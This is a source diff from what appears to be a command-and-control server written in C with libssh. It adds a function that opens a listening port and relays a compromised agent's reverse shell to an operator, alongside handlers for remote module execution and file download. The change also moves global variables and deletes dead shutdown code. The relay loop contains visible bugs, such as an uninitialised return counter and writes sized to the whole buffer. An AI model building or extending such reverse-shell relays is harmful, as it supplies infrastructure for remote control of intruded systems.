@@ -42,12 +42,6 @@ void cleanup_pcap(){
 }
 #endif
 
-ssh_session session_array[MAX_CONN];
-pthread_t thread_array[MAX_CONN];
-pthread_mutex_t session_lock;
-FILE *log_file;
-struct clientNode first;
-int halt = 0;
 
 
 #ifdef HAVE_ARGP_H
@@ -133,6 +127,7 @@ static error_t parse_opt (int key, char *arg, struct argp_state *state) {
     char *pass;
     char *id;
     int dbg = 0;
+    int halt = 0;
     char buff[256];
   
     switch (key) {
@@ -203,6 +198,13 @@ static error_t parse_opt (int key, char *arg, struct argp_state *state) {
 /* Our argp parser. */
 static struct argp argp = {options, parse_opt, args_doc, doc, NULL, NULL, NULL};
 #endif /* HAVE_ARGP_H */
+
+/*Global variables and data structures*/
+pthread_t thread_array[MAX_CONN];
+pthread_mutex_t session_lock;
+FILE *log_file;
+struct clientNode first;
+
 
 /*Downloads file from connected entity*/
 int server_file_download(clientDat *session, char *ptr, int is_manager, char *extra){
@@ -862,6 +864,95 @@ void manager_handler(struct clientNode *node){
     
 }
 
+/*Handles reverse shell connections and forwarding*/
+int agent_handle_reverse_shell(clientDat *agent){
+    int port = (rand() % (65535-2048))+ 2048;
+    char agent_buffer[BUFSIZ];
+    char manager_buffer[BUFSIZ];
+    char logbuff[BUFSIZ];
+    int server_fd, manager, rc; 
+    struct sockaddr_in address; 
+    int opt = 1; 
+    int addrlen = sizeof(address); 
+
+    memset(agent_buffer, 0, sizeof(agent_buffer));
+    memset(manager_buffer, 0, sizeof(manager_buffer));
+    memset(logbuff, 0, sizeof(logbuff));
+       
+    // Creating socket file descriptor 
+    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) 
+    { 
+        perror("socket failed"); 
+        return EXIT_FAILURE; 
+    } 
+       
+    // Forcefully attaching socket to the port 8080 
+    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) 
+    { 
+        perror("setsockopt"); 
+        return EXIT_FAILURE; 
+    } 
+    address.sin_family = AF_INET; 
+    address.sin_addr.s_addr = INADDR_ANY; 
+    address.sin_port = htons(port); 
+       
+    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address))<0) 
+    { 
+        perror("bind failed"); 
+        return EXIT_FAILURE; 
+    }
+
+
+
+    if (listen(server_fd, 3) < 0) 
+    { 
+        perror("listen"); 
+        return EXIT_FAILURE; 
+    } 
+    if ((manager = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen))<0) 
+    { 
+        perror("accept"); 
+        exit(EXIT_FAILURE); 
+    } 
+    while (manager && ssh_channel_is_open(agent->chan))
+    {
+        // Get stuff from the agent
+        while(rc != 0){
+            rc = ssh_channel_read(agent->chan, agent_buffer, sizeof(agent_buffer), 0);
+            if (rc == SSH_ERROR)
+            {
+                sprintf(logbuff, "Client %s: Failed to forward data: %s\n", agent->id, ssh_get_error(agent->session));
+                log_info(logbuff);
+                return EXIT_FAILURE;
+            }
+            // send info to manager socket
+            write(manager, agent_buffer, rc);
+            memset(agent_buffer, 0, sizeof(agent_buffer));
+        }
+        // Get stuff from the manager socket
+        while(rc != 0){
+            rc = read(manager, manager_buffer, sizeof(manager_buffer));
+            if (rc == SSH_ERROR)
+            {
+                sprintf(logbuff, "Manager %s: Failed to forward data: %s\n", agent->id, ssh_get_error(agent->session));
+                log_info(logbuff);
+                return EXIT_FAILURE;
+            }
+            // send info to manager socket
+            ssh_channel_write(agent->chan, manager_buffer, sizeof(manager_buffer));
+            memset(manager_buffer, 0, sizeof(manager_buffer));
+        }
+
+        
+
+        
+    }
+    printf("Someone disconnected...\n");
+    
+    return 0; 
+
+}
+
 /*Handler for agent connections and flow*/
 void agent_handler(struct clientNode *node){
     clientDat *agent = node->data;
@@ -944,6 +1035,7 @@ void agent_handler(struct clientNode *node){
 
         case AGENT_REV_SHELL:
             printf("Agent reverse shell caught\n");
+            agent_handle_reverse_shell(agent);
             break;
 
         case AGENT_EXEC_MODULE:
@@ -1164,9 +1256,7 @@ void *handle_conn(void *input){
         
 }
 
-
-
-// REWORK
+/*Handles signals and terminates the program*/
 void handleTerm(int term){
 
     struct clientNode *currnode = &first;
@@ -1182,32 +1272,6 @@ void handleTerm(int term){
     log_info("Server shutting down");
     close_log();
     return;
-// Breaks here for now...
-
-    printf("Terminating...\n");
-    int termTime = 10;
-    int curr = 0;
-    // Todo: clean up active connections from server.
-    //pthread_mutex_lock(&session_lock);
-    for (size_t i = 0; i < MAX_CONN; i++)
-    {
-        if(session_array[i] != NULL){
-            printf("TERM: Found active connection at index %lu\n", i);
-            while(session_array[i] != NULL){
-                if(termTime > curr){
-                    printf("TERM: Waiting for connection to terminate (%d/%d sec)\n", curr, termTime);
-                    sleep(1);
-                    curr++;
-                } else {
-                    printf("TERM: Killing connection...\n");
-                    ssh_free(session_array[i]);
-                }
-            }
-        }
-    }
-    //pthread_mutex_unlock(&session_lock);
-    exit(-1);
-
 }
 
 void print_clientDat(clientDat *str){
